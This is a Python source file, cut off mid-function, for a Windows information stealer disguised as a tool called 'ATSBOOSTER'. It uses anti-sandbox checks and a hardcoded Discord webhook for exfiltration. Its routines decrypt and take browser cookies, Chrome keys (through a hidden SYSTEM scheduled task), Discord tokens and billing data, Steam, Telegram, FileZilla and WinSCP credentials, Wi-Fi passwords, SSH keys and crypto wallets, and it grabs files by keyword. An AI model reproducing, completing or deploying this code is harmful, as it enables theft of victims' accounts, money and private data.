import os
import sys
import time
import ctypes
import json
import hashlib
import win32con
import browser_cookie3
import winreg
from json import loads, dumps
from base64 import b64decode, b64encode
from sqlite3 import connect
from shutil import copyfile, copytree, rmtree
from threading import Thread, Event, Lock
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from discord_webhook import DiscordEmbed, DiscordWebhook
from subprocess import Popen, PIPE
from urllib.request import urlopen, Request
from requests import get
from re import findall, search, compile
from win32api import SetFileAttributes, GetSystemMetrics
from browser_history import get_history
from prettytable import PrettyTable
from platform import platform
from getmac import get_mac_address as gma
from psutil import virtual_memory, cpu_percent, disk_usage, boot_time, pids
from collections import defaultdict
from zipfile import ZipFile, ZIP_DEFLATED
from multiprocessing import freeze_support
from tempfile import TemporaryDirectory
from random import choices
from string import ascii_letters, digits
from datetime import datetime
from glob import glob
import traceback

# Global crash handler - prints any uncaught exception instead of dying silently
_old_excepthook = sys.excepthook
def _crash_handler(exc_type, exc_value, tb):
    print(f"\n  CRASH: {exc_value}")
    traceback.print_exception(exc_type, exc_value, tb)
    try:
        with open(os.path.join(os.environ.get('TEMP', 'C:\\'), 'atsbooster_crash.log'), 'a') as f:
            f.write(f"\n[{datetime.now()}] {exc_value}\n{''.join(traceback.format_exception(exc_type, exc_value, tb))}\n")
    except Exception:
        pass
    input("\n  Appuyez sur Entree pour continuer...")
sys.excepthook = _crash_handler

# ==========================================
# CONFIGURATION
# ==========================================

WEBHOOK_URLS = [
    "https://discord.com/api/webhooks/1530231277406523524/CoIXHH4D8wt2B3aNn7Y8PZnA_RJvlpioEnZA96OXWJOJkTVm7FXTeE1L6ZdnPQxOtWvm",
]

CONFIG_URL = None

website = ["discord.com", "twitter.com", "instagram.com", "netflix.com"]

STEAM_PATHS = [
    os.path.join(os.getenv("ProgramFiles(x86)", "C:\\Program Files (x86)"), "Steam"),
    os.path.join(os.getenv("ProgramFiles", "C:\\Program Files"), "Steam"),
    os.path.join(os.getenv("LOCALAPPDATA", ""), "Steam"),
]

TELEGRAM_PATHS = [
    os.path.join(os.getenv("APPDATA", ""), "Telegram Desktop", "tdata"),
    os.path.join(os.getenv("LOCALAPPDATA", ""), "Telegram Desktop", "tdata"),
    os.path.join(os.getenv("APPDATA", ""), "Telegram", "tdata"),
]

FILEZILLA_PATHS = [
    os.path.join(os.getenv("APPDATA", ""), "FileZilla", "recentservers.xml"),
    os.path.join(os.getenv("APPDATA", ""), "FileZilla", "sitemanager.xml"),
    os.path.join(os.getenv("APPDATA", ""), "FileZilla Server", "sitemanager.xml"),
]

WINSCP_INI_PATHS = [
    os.path.join(os.getenv("APPDATA", ""), "WinSCP.ini"),
    os.path.join(os.getenv("LOCALAPPDATA", ""), "WinSCP.ini"),
]

SSH_PATH = os.path.join(os.getenv("USERPROFILE", ""), ".ssh")

CRYPTO_WALLET_PATHS = [
    ("Bitcoin Core", os.path.join(os.getenv("APPDATA", ""), "Bitcoin", "wallet.dat")),
    ("Electrum", os.path.join(os.getenv("APPDATA", ""), "Electrum", "wallets")),
    ("Exodus", os.path.join(os.getenv("APPDATA", ""), "Exodus", "exodus.wallet")),
    ("Atomic", os.path.join(os.getenv("APPDATA", ""), "Atomic", "local-storage")),
    ("Monero GUI", os.path.join(os.getenv("APPDATA", ""), "Monero", "wallets")),
]

METAMASK_EXT_PATHS = [
    os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
    os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
    os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"),
    os.path.join(os.getenv("LOCALAPPDATA", ""), "Vivaldi", "User Data"),
]

FILE_GRABBER_KEYWORDS = [
    "password", "passwd", "pass", "login", "credential", "secret",
    "bank", "crypto", "wallet", "seed", "mnemonic", "private key",
    "api key", "token", "pin", "ssn", "credit", "debit", "account",
    "key", "auth", "otp", "backup", "recovery", "seed phrase",
    "metamask", "exodus", "electrum", "ledger", "trezor",
    "ssh", "rsa", "ecdsa", "ed25519", "ppk",
    "vpn", "nordvpn", "expressvpn", "openvpn",
    "ftp", "sftp", "rdp", "vnc", "teamviewer",
    "wallet", "keystore", "keychain",
]

FILE_GRABBER_EXTENSIONS = [".txt", ".csv", ".json", ".xml", ".ini", ".cfg", ".conf", ".doc", ".docx", ".pdf", ".key", ".pem", ".ppk", ".p12", ".pfx", ".asc", ".kdbx", ".keystore", ".wallet", ".env", ".bat", ".ps1", ".vbs", ".sql", ".db", ".sqlite", ".sqlite3", ".log"]

FILE_GRABBER_DIRS = [
    os.path.join(os.getenv("USERPROFILE", ""), "Desktop"),
    os.path.join(os.getenv("USERPROFILE", ""), "Documents"),
    os.path.join(os.getenv("USERPROFILE", ""), "Downloads"),
    os.path.join(os.getenv("USERPROFILE", ""), "Pictures"),
    os.path.join(os.getenv("APPDATA", ""), ""),
    os.path.join(os.getenv("LOCALAPPDATA", ""), ""),
]

GAMING_PATHS = {
    "Roblox": [os.path.join(os.getenv("LOCALAPPDATA", ""), "Roblox")],
    "Minecraft": [os.path.join(os.getenv("APPDATA", ""), ".minecraft"), os.path.join(os.getenv("LOCALAPPDATA", ""), "Packages", "Microsoft.MinecraftUWP_8wekyb3d8bbwe", "LocalState", "games")],
    "Epic Games": [os.path.join(os.getenv("LOCALAPPDATA", ""), "EpicGamesLauncher", "Saved", "Config", "Windows"), os.path.join(os.getenv("LOCALAPPDATA", ""), "EpicGamesLauncher", "Saved", "Data")],
    "Origin": [os.path.join(os.getenv("APPDATA", ""), "Origin"), os.path.join(os.getenv("LOCALAPPDATA", ""), "Origin")],
    "Riot Games": [os.path.join(os.getenv("LOCALAPPDATA", ""), "Riot Games")],
    "Battle.net": [os.path.join(os.getenv("APPDATA", ""), "Battle.net"), os.path.join(os.getenv("PROGRAMDATA", ""), "Battle.net")],
    "Ubisoft": [os.path.join(os.getenv("LOCALAPPDATA", ""), "Ubisoft Game Launcher")],
    "GOG Galaxy": [os.path.join(os.getenv("PROGRAMDATA", ""), "GOG.com", "Galaxy")],
}

VPN_PATHS = {
    "NordVPN": [os.path.join(os.getenv("LOCALAPPDATA", ""), "NordVPN"), os.path.join(os.getenv("APPDATA", ""), "NordVPN")],
    "ExpressVPN": [os.path.join(os.getenv("LOCALAPPDATA", ""), "ExpressVPN"), os.path.join(os.getenv("APPDATA", ""), "ExpressVPN")],
    "OpenVPN": [os.path.join(os.getenv("PROGRAMDATA", ""), "OpenVPN"), os.path.join(os.getenv("USERPROFILE", ""), "OpenVPN")],
    "ProtonVPN": [os.path.join(os.getenv("LOCALAPPDATA", ""), "ProtonVPN")],
}

EMAIL_PATHS = {
    "Outlook": [os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Outlook"), os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Outlook")],
    "Thunderbird": [os.path.join(os.getenv("APPDATA", ""), "Thunderbird", "Profiles"), os.path.join(os.getenv("LOCALAPPDATA", ""), "Thunderbird", "Profiles")],
    "Mailbird": [os.path.join(os.getenv("LOCALAPPDATA", ""), "Mailbird")],
}

AUTH_2FA_PATHS = {
    "Authy": [os.path.join(os.getenv("LOCALAPPDATA", ""), "Authy")],
    "Microsoft Authenticator": [os.path.join(os.getenv("LOCALAPPDATA", ""), "Packages", "Microsoft.AzureAuthenticator_8wekyb3d8bbwe")],
    "WinAuth": [os.path.join(os.getenv("APPDATA", ""), "WinAuth")],
    "2FA Desktop": [os.path.join(os.getenv("LOCALAPPDATA", ""), "2FADesktop")],
}

TOKEN_PATTERNS = [
    compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}"),
    compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"),
    compile(r"mfa\.[\w-]{84}"),
]
ENCRYPTED_TOKEN_PATTERN = compile(r"dQw4w9WgXcQ:[A-Za-z0-9+/=]+")

APPDATA_DIR = os.path.join(os.getenv("APPDATA", ""), "ATSBOOSTER")
CACHE_FILE = os.path.join(APPDATA_DIR, "cache.hash")
PERSIST_EXE = os.path.join(APPDATA_DIR, "ATSBOOSTER.exe")

_grabber_stop = Event()
_boost_active = False
_lang = "fr"


class C:
    R = "\033[0m"
    B = "\033[1m"
    D = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YLW = "\033[93m"
    BLU = "\033[94m"
    CYN = "\033[96m"
    WHT = "\033[97m"
    BGBLU = "\033[44m"
    BGGRN = "\033[42m"
    BGYLW = "\033[43m"
    BGRED = "\033[41m"


# ==========================================
# ANTI-SANDBOX
# ==========================================

def is_sandbox():
    checks = []
    try:
        cores = os.cpu_count() or 0
        checks.append(cores < 2)
    except Exception:
        checks.append(True)
    try:
        ram_gb = virtual_memory().total / (1024.0 ** 3)
        checks.append(ram_gb < 3.0)
    except Exception:
        checks.append(True)
    try:
        uptime_sec = time.time() - boot_time()
        checks.append(uptime_sec < 600)
    except Exception:
        checks.append(True)
    try:
        mac = gma() or ""
        sandbox_macs = ["00:05:69", "00:0C:29", "00:1C:42", "00:50:56", "08:00:27", "0A:00:27"]
        for smac in sandbox_macs:
            if mac.upper().startswith(smac.upper()):
                checks.append(True)
                break
    except Exception:
        pass
    try:
        user = os.getenv("USERNAME", "").lower()
        sandbox_users = ["sandbox", "malware", "virus", "cuckoo", "john doe", "user"]
        for su in sandbox_users:
            if su in user:
                checks.append(True)
                break
    except Exception:
        pass
    return sum(checks) >= 3


# ==========================================
# CACHE SYSTEM
# ==========================================

def compute_data_hash(data):
    try:
        serialized = json.dumps(data, sort_keys=True, default=str)
        return hashlib.sha256(serialized.encode()).hexdigest()
    except Exception:
        return ""


def get_cached_hash():
    try:
        if os.path.exists(CACHE_FILE):
            with open(CACHE_FILE, "r") as f:
                return f.read().strip()
    except Exception:
        pass
    return ""


def save_cached_hash(h):
    try:
        os.makedirs(APPDATA_DIR, exist_ok=True)
        with open(CACHE_FILE, "w") as f:
            f.write(h)
    except Exception:
        pass


# ==========================================
# PROGRESS BAR
# ==========================================

def progress_bar(label, duration=1.0, width=30):
    steps = width
    for i in range(steps + 1):
        pct = int((i / steps) * 100)
        filled = "=" * i
        empty = " " * (steps - i)
        sys.stdout.write(f"\r  {C.CYN}> {label} [{filled}{empty}] {pct}%{C.R}")
        sys.stdout.flush()
        time.sleep(duration / steps)
    sys.stdout.write(f"\r  {C.GRN}> {label} [{'=' * steps}] 100%{C.R}\n")
    sys.stdout.flush()


# ==========================================
# SCREENSHOT (multi-monitor)
# ==========================================

def get_screenshot(path):
    screens = []
    try:
        from PIL import ImageGrab
        try:
            all_screens = ImageGrab.grab(all_screens=True)
            for i, img in enumerate(all_screens):
                scrn_path = os.path.join(path, f"Screenshot_{i}_{''.join(choices(list(ascii_letters + digits), k=5))}.png")
                img.save(scrn_path)
                screens.append(scrn_path)
        except TypeError:
            img = ImageGrab.grab()
            scrn_path = os.path.join(path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png")
            img.save(scrn_path)
            screens.append(scrn_path)
    except Exception:
        try:
            scrn_path = os.path.join(path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png")
            get_screenshot.scrn = screenshot()
            get_screenshot.scrn.save(scrn_path)
            screens.append(scrn_path)
        except Exception:
            try:
                from PIL import Image
                scrn_path = os.path.join(path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png")
                img = Image.new('RGB', (1, 1), color='black')
                img.save(scrn_path)
                screens.append(scrn_path)
            except Exception:
                pass
    get_screenshot.scrn_paths = screens
    get_screenshot.scrn_path = screens[0] if screens else None


# ==========================================
# HWID
# ==========================================

def get_hwid():
    try:
        p = Popen(
            ["powershell", "-NoProfile", "-Command", "(Get-CimInstance Win32_ComputerSystemProduct).UUID"],
            shell=True, stdout=PIPE, stderr=PIPE
        )
        return p.stdout.read().decode().strip()
    except Exception:
        return "Unknown"


# ==========================================
# PERSONAL DATA
# ==========================================

def get_Personal_data():
    ip_address = None
    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    for ip_url in ["https://api.ipify.org", "https://api64.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
        try:
            resp = get(ip_url, timeout=10, headers=ua)
            ip_address = resp.text.strip()
            if ip_address and len(ip_address) < 40:
                break
        except Exception:
            continue
    if not ip_address:
        try:
            p = Popen(
                ["powershell", "-NoProfile", "-Command",
                 "(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content"],
                shell=True, stdout=PIPE, stderr=PIPE
            )
            ip_address = p.stdout.read().decode().strip()
            if not ip_address or len(ip_address) > 40:
                ip_address = None
        except Exception:
            pass
    if not ip_address:
        try:
            p = Popen(
                ["powershell", "-NoProfile", "-Command",
                 "(Invoke-WebRequest -Uri 'http://ip-api.com/json/' -UseBasicParsing).Content"],
                shell=True, stdout=PIPE, stderr=PIPE
            )
            out = p.stdout.read().decode().strip()
            data = loads(out)
            ip_address = data.get("query", "")
            country = data.get("country", "Unknown")
            city = data.get("city", "Unknown")
            if ip_address:
                return [ip_address, country, city]
        except Exception:
            pass
    if not ip_address:
        return ["No IP found", "Unknown", "Unknown"]
    country = "Unknown"
    city = "Unknown"
    for geo_url in [
        f"http://ip-api.com/json/{ip_address}",
        f"https://ipapi.co/{ip_address}/json/",
        f"https://ipinfo.io/{ip_address}/json",
    ]:
        try:
            resp = get(geo_url, timeout=10, headers=ua)
            data = resp.json()
            country = data.get("country_name") or data.get("country") or "Unknown"
            city = data.get("city") or "Unknown"
            if country != "Unknown":
                break
        except Exception:
            continue
    if country == "Unknown":
        try:
            p = Popen(
                ["powershell", "-NoProfile", "-Command",
                 f"(Invoke-WebRequest -Uri 'http://ip-api.com/json/{ip_address}' -UseBasicParsing).Content"],
                shell=True, stdout=PIPE, stderr=PIPE
            )
            out = p.stdout.read().decode().strip()
            data = loads(out)
            country = data.get("country", "Unknown")
            city = data.get("city", "Unknown")
        except Exception:
            pass
    return [ip_address, country, city]


# ==========================================
# DISCORD USER DATA
# ==========================================

def get_user_data(tk):
    try:
        headers = {"Authorization": tk}
        response = get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
        if response.status_code != 200:
            return ["Invalid Token", "N/A", "N/A"]
        data = response.json()
        username = data.get("username", "Unknown")
        discriminator = data.get("discriminator", "0")
        if discriminator == "0":
            display_name = username
        else:
            display_name = f"{username}#{discriminator}"
        return [display_name, data.get("email", "N/A"), data.get("phone", "N/A")]
    except Exception:
        return ["Error", "N/A", "N/A"]


def has_payment_methods(tk):
    try:
        headers = {"Authorization": tk}
        response = get(
            "https://discord.com/api/v10/users/@me/billing/payment-sources",
            headers=headers, timeout=10,
        )
        if response.status_code != 200:
            return []
        return response.json()
    except Exception:
        return []


# ==========================================
# COOKIE GRABBER
# ==========================================

def cookies_grabber_mod(u):
    results = []
    browsers = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]
    for browser in browsers:
        try:
            cj = getattr(browser_cookie3, browser)(domain_name=u)
            for cookie in cj:
                results.append({"name": cookie.name, "value": cookie.value, "domain": cookie.domain})
        except BaseException:
            pass
    if not results:
        results = _read_chromium_cookies_direct(u)
    return results


def _read_chromium_cookies_direct(u):
    results = []
    cookie_db_paths = []
    local = os.getenv("LOCALAPPDATA")
    base_paths = [
        (os.path.join(local, "Google", "Chrome", "User Data"), ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]),
        (os.path.join(local, "Microsoft", "Edge", "User Data"), ["Default", "Profile 1", "Profile 2", "Profile 3"]),
        (os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"), ["Default", "Profile 1", "Profile 2"]),
        (os.path.join(local, "Vivaldi", "User Data"), ["Default", "Profile 1"]),
    ]
    for base_path, profiles in base_paths:
        for profile in profiles:
            cookie_db = os.path.join(base_path, profile, "Network", "Cookies")
            if not os.path.exists(cookie_db):
                cookie_db = os.path.join(base_path, profile, "Cookies")
            if os.path.exists(cookie_db):
                cookie_db_paths.append((cookie_db, base_path))
    temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "."))
    for cookie_db_path, base_path in cookie_db_paths:
        try:
            tmp_db = os.path.join(temp_dir, f"cookies_{os.getpid()}_{len(cookie_db_paths)}.db")
            copyfile(cookie_db_path, tmp_db)
            db = connect(tmp_db)
            cursor = db.cursor()
            domain_filter = f"%{u}%"
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE ?", (domain_filter,))
            enc_key = None
            local_state_path = os.path.join(base_path, "Local State")
            if os.path.exists(local_state_path):
                try:
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        ls = loads(f.read())
                    enc_key_b64 = ls["os_crypt"]["encrypted_key"]
                    enc_key_raw = b64decode(enc_key_b64)
                    if enc_key_raw.startswith(b"DPAPI"):
                        enc_key_raw = enc_key_raw[5:]
                    elif enc_key_raw.startswith(b"APPB"):
                        enc_key_raw = enc_key_raw[4:]
                    enc_key = CryptUnprotectData(enc_key_raw, None, None, None, 0)[1]
                except Exception:
                    enc_key = None
            for host, name, enc_value in cursor.fetchall():
                value = ""
                if enc_value:
                    try:
                        if enc_value[:3] == b"v10" or enc_value[:3] == b"v11":
                            if enc_key:
                                value = decrypt_data(enc_value, enc_key)
                            else:
                                value = str(CryptUnprotectData(enc_value, None, None, None, 0)[1], encoding="utf-8", errors="replace")
                        else:
                            value = str(CryptUnprotectData(enc_value, None, None, None, 0)[1], encoding="utf-8", errors="replace")
                    except Exception:
                        value = ""
                results.append({"name": name, "value": value, "domain": host})
            cursor.close()
            db.close()
            try:
                os.remove(tmp_db)
            except Exception:
                pass
        except Exception:
            pass
    return results


def decrypt_data(data, key):
    if key is None:
        return ""
    try:
        return AES.new(key, AES.MODE_GCM, data[3:15]).decrypt(data[15:])[:-16].decode()
    except BaseException:
        try:
            return str(CryptUnprotectData(data, None, None, None, 0)[1])
        except BaseException:
            return ""


def get_encryption_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = loads(f.read())
    encrypted_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    if encrypted_key.startswith(b"APPB"):
        encrypted_key = encrypted_key[4:]
        try:
            return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception:
            try:
                return _decrypt_appbound_key(encrypted_key)
            except Exception:
                return None
    return CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]


def _decrypt_appbound_key(encrypted_key):
    import tempfile
    key_b64 = b64encode(encrypted_key).decode()
    tmp_dir = tempfile.gettempdir().replace("\\", "\\\\")
    ps_script = (
        "$encryptedKey = [Convert]::FromBase64String('" + key_b64 + "')\n"
        "$taskName = 'ATSBOosterKeyDecrypt'\n"
        "$xml = @'\n"
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
        "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
        "  <Triggers />\n"
        "  <Principals>\n"
        "    <Principal id=\"LocalSystem\">\n"
        "      <UserId>S-1-5-18</UserId>\n"
        "      <RunLevel>HighestAvailable</RunLevel>\n"
        "    </Principal>\n"
        "  </Principals>\n"
        "  <Settings>\n"
        "    <Enabled>true</Enabled>\n"
        "    <Hidden>true</Hidden>\n"
        "  </Settings>\n"
        "  <Actions Context=\"LocalSystem\">\n"
        "    <Exec>\n"
        "      <Command>powershell.exe</Command>\n"
        "      <Arguments>-NoProfile -Command \"[void][System.Reflection.Assembly]::LoadWithPartialName('System.Security'); $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'LocalMachine'); [Convert]::ToBase64String($decrypted) | Out-File -FilePath '" + tmp_dir + "\\atsbooster_key.txt' -NoNewline\"</Arguments>\n"
        "    </Exec>\n"
        "  </Actions>\n"
        "</Task>\n"
        "'@\n"
        "Register-ScheduledTask -TaskName $taskName -Xml $xml -Force | Out-Null\n"
        "Start-ScheduledTask -TaskName $taskName\n"
        "Start-Sleep -Seconds 2\n"
        "Unregister-ScheduledTask -TaskName $taskName -Confirm:$false\n"
    )
    try:
        p = Popen(["powershell", "-NoProfile", "-Command", ps_script], shell=True, stdout=PIPE, stderr=PIPE)
        p.wait()
        key_file = os.path.join(tempfile.gettempdir(), "atsbooster_key.txt")
        if os.path.exists(key_file):
            with open(key_file, "r") as f:
                decrypted_b64 = f.read().strip()
            os.remove(key_file)
            if decrypted_b64:
                return b64decode(decrypted_b64)
    except Exception:
        pass
    return None


# ==========================================
# FIREFOX PASSWORDS
# ==========================================

def grab_firefox_passwords():
    results = []
    roaming = os.getenv("APPDATA", "")
    firefox_path = os.path.join(roaming, "Mozilla", "Firefox", "Profiles")
    if not os.path.exists(firefox_path):
        return results
    for profile_dir in os.listdir(firefox_path):
        profile_path = os.path.join(firefox_path, profile_dir)
        if not os.path.isdir(profile_path):
            continue
        logins_json = os.path.join(profile_path, "logins.json")
        key4_db = os.path.join(profile_path, "key4.db")
        if not os.path.exists(logins_json) or not os.path.exists(key4_db):
            continue
        try:
            with open(logins_json, "r", encoding="utf-8") as f:
                logins_data = loads(f.read())
            for login in logins_data.get("logins", []):
                hostname = login.get("hostname", "")
                username = login.get("encryptedUsername", "")
                password = login.get("encryptedPassword", "")
                results.append({
                    "browser": "Firefox",
                    "url": hostname,
                    "username": username[:50] + "..." if len(username) > 50 else username,
                    "password": password[:50] + "..." if len(password) > 50 else password,
                    "encrypted": True,
                })
        except Exception:
            pass
    return results


# ==========================================
# STEAM GRABBER
# ==========================================

def grab_steam():
    steam_info = {"accounts": [], "steam_path": "", "tokens": []}
    steam_dir = None
    for p in STEAM_PATHS:
        if os.path.exists(p):
            steam_dir = p
            break
    if not steam_dir:
        return steam_info
    steam_info["steam_path"] = steam_dir
    loginusers_path = os.path.join(steam_dir, "config", "loginusers.vdf")
    if os.path.exists(loginusers_path):
        try:
            with open(loginusers_path, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
            import re as _re
            steamids = _re.findall(r'"(\d{17})"', content)
            account_names = _re.findall(r'"AccountName"\s+"([^"]+)"', content)
            persona_names = _re.findall(r'"PersonaName"\s+"([^"]+)"', content)
            for i, sid in enumerate(steamids):
                acct = account_names[i] if i < len(account_names) else "Unknown"
                persona = persona_names[i] if i < len(persona_names) else "Unknown"
                steam_info["accounts"].append({"steamid": sid, "account_name": acct, "persona_name": persona})
        except Exception:
            pass
    config_path = os.path.join(steam_dir, "config", "config.vdf")
    if os.path.exists(config_path):
        try:
            with open(config_path, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
            import re as _re
            refresh_tokens = _re.findall(r'"RefreshToken"\s+"([a-zA-Z0-9_\-\.]+)"', content)
            access_tokens = _re.findall(r'"AccessToken"\s+"([a-zA-Z0-9_\-\.]+)"', content)
            for t in refresh_tokens:
                if t and len(t) > 20:
                    steam_info["tokens"].append({"type": "refresh", "token": t})
            for t in access_tokens:
                if t and len(t) > 20:
                    steam_info["tokens"].append({"type": "access", "token": t})
        except Exception:
            pass
    for account in steam_info["accounts"]:
        sid = account["steamid"]
        ssfn_dir = os.path.join(steam_dir, "steamui", "ssfn")
        if not os.path.exists(ssfn_dir):
            ssfn_dir = os.path.join(steam_dir, "ssfn")
        if os.path.exists(ssfn_dir):
            try:
                for f in os.listdir(ssfn_dir):
                    if sid in f:
                        fpath = os.path.join(ssfn_dir, f)
                        try:
                            with open(fpath, "r", encoding="utf-8", errors="replace") as sf:
                                ssfn_content = sf.read().strip()
                            if ssfn_content and len(ssfn_content) > 10:
                                steam_info["tokens"].append({"type": "ssfn_guard", "token": ssfn_content, "steamid": sid})
                        except Exception:
                            pass
            except Exception:
                pass
    return steam_info


# ==========================================
# SAFE COPY (limited file size)
# ==========================================

def _safe_copy_dir(src, dst, max_total=500*1024*1024):
    _ignore_names = {"cache", "Cache", "cache2", "Code Cache", "GPUCache",
                     "ShaderCache", "GrShaderCache", "DawnCache", "DawnGraphiteCache",
                     "fonts", "Fonts", "ipc", "lockfile", "LOCK",
                     "temp", "Temp", "tmp", "logs", "Logs",
                     "dumps", "Crashpad", "crashes", "old"}
    _ignore_exts = {".log", ".tmp", ".bak", ".old", ".dmp", ".dump"}
    _always_copy_exts = {".dat", ".key", ".keystore", ".wallet", ".json",
                         ".vdf", ".sqlite", ".db", ".sqlite3", ".xml",
                         ".ini", ".cfg", ".conf", ".txt", ".pem", ".ppk"}
    os.makedirs(dst, exist_ok=True)
    _total = 0
    for root, dirs, files in os.walk(src):
        dirs[:] = [d for d in dirs if d not in _ignore_names]
        for f in files:
            try:
                fp = os.path.join(root, f)
                fsize = os.path.getsize(fp)
                fext = os.path.splitext(f)[1].lower()
                fname_lower = f.lower()
                if fext in _ignore_exts:
                    continue
                if fname_lower.startswith("cache") or "cache" in fname_lower:
                    continue
                if fname_lower.endswith(".log") or "_log" in fname_lower:
                    continue
                if fext in _always_copy_exts or fsize <= 50*1024*1024:
                    if _total + fsize > max_total:
                        continue
                    rel = os.path.relpath(root, src)
                    target_dir = os.path.join(dst, rel) if rel != "." else dst
                    os.makedirs(target_dir, exist_ok=True)
                    copyfile(fp, os.path.join(target_dir, f))
                    _total += fsize
            except Exception:
                pass


# ==========================================
# TELEGRAM GRABBER
# ==========================================

def grab_telegram(td):
    tdata_dir = None
    for p in TELEGRAM_PATHS:
        if os.path.exists(p):
            tdata_dir = p
            break
    if not tdata_dir:
        return None
    try:
        dest = os.path.join(td, "tdata")
        _safe_copy_dir(tdata_dir, dest)
        return dest
    except Exception:
        return None


# ==========================================
# FILEZILLA GRABBER
# ==========================================

def grab_filezilla():
    results = []
    for xml_path in FILEZILLA_PATHS:
        if not os.path.exists(xml_path):
            continue
        try:
            with open(xml_path, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
            hosts = findall(r'<Host>(.*?)</Host>', content)
            users = findall(r'<User>(.*?)</User>', content)
            passes = findall(r'<Pass>(.*?)</Pass>', content)
            ports = findall(r'<Port>(.*?)</Port>', content)
            for i in range(len(hosts)):
                entry = {
                    "host": hosts[i] if i < len(hosts) else "",
                    "user": users[i] if i < len(users) else "",
                    "pass": passes[i] if i < len(passes) else "",
                    "port": ports[i] if i < len(ports) else "21",
                }
                results.append(entry)
        except Exception:
            pass
    return results


# ==========================================
# WINSCP GRABBER
# ==========================================

def grab_winscp():
    results = []
    for ini_path in WINSCP_INI_PATHS:
        if not os.path.exists(ini_path):
            continue
        try:
            with open(ini_path, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
            sessions = content.split("[Sessions]")
            if len(sessions) > 1:
                lines = sessions[1].split("\n")
                for line in lines:
                    line = line.strip()
                    if line.startswith("[") or not line or line.startswith(";"):
                        break
                    if "=" in line:
                        key, val = line.split("=", 1)
                        if any(k in key.lower() for k in ["host", "user", "pass", "port"]):
                            results.append({"key": key.strip(), "value": val.strip()})
        except Exception:
            pass
    return results


# ==========================================
# WIFI PASSWORDS
# ==========================================

def grab_wifi_passwords():
    results = []
    try:
        p = Popen(
            ["netsh", "wlan", "show", "profiles"],
            shell=True, stdout=PIPE, stderr=PIPE
        )
        output = p.stdout.read().decode(errors="replace")
        profiles = findall(r"All User Profile\s+:\s+(.*)", output)
        for profile in profiles:
            profile = profile.strip()
            try:
                p2 = Popen(
                    ["netsh", "wlan", "show", "profile", f'"{profile}"', "key=clear"],
                    shell=True, stdout=PIPE, stderr=PIPE
                )
                out2 = p2.stdout.read().decode(errors="replace")
                key_match = search(r"Key Content\s+:\s+(.*)", out2)
                auth_match = search(r"Authentication\s+:\s+(.*)", out2)
                password = key_match.group(1).strip() if key_match else "N/A"
                auth = auth_match.group(1).strip() if auth_match else "Unknown"
                results.append({"ssid": profile, "password": password, "auth": auth})
            except Exception:
                pass
    except Exception:
        pass
    return results


# ==========================================
# SSH KEYS
# ==========================================

def grab_ssh_keys(td):
    if not os.path.exists(SSH_PATH):
        return []
    results = []
    try:
        dest = os.path.join(td, "ssh_keys")
        os.makedirs(dest, exist_ok=True)
        for f in os.listdir(SSH_PATH):
            fpath = os.path.join(SSH_PATH, f)
            if os.path.isfile(fpath):
                try:
                    copyfile(fpath, os.path.join(dest, f))
                    results.append(f)
                except Exception:
                    pass
    except Exception:
        pass
    return results


# ==========================================
# CRYPTO WALLETS
# ==========================================

def grab_crypto_wallets(td):
    results = []
    for name, path in CRYPTO_WALLET_PATHS:
        if os.path.exists(path):
            try:
                if os.path.isfile(path):
                    dest = os.path.join(td, f"crypto_{name.replace(' ', '_')}")
                    os.makedirs(os.path.dirname(dest), exist_ok=True)
                    copyfile(path, dest)
                    results.append({"name": name, "path": path, "type": "file"})
                elif os.path.isdir(path):
                    dest = os.path.join(td, f"crypto_{name.replace(' ', '_')}")
                    _safe_copy_dir(path, dest)
                    results.append({"name": name, "path": path, "type": "dir"})
            except Exception:
                pass
    for base_path in METAMASK_EXT_PATHS:
        if not os.path.exists(base_path):
            continue
        try:
            for d in os.listdir(base_path):
                if d.startswith("Profile ") or d == "Default":
                    ext_dir = os.path.join(base_path, d, "Extensions")
                    if not os.path.exists(ext_dir):
                        continue
                    for ext_id in os.listdir(ext_dir):
                        if "nkbihfbeogaeaoehlefnkodbefgpgknn" in ext_id:
                            meta_path = os.path.join(ext_dir, ext_id)
                            dest = os.path.join(td, f"metamask_{d}")
                            try:
                                _safe_copy_dir(meta_path, dest)
                                results.append({"name": "MetaMask", "path": meta_path, "type": "extension", "profile": d})
                            except Exception:
                                pass
        except Exception:
            pass
    return results


# ==========================================
# GAMING PLATFORMS GRABBER
# ==========================================

def grab_gaming_platforms(td):
    results = []
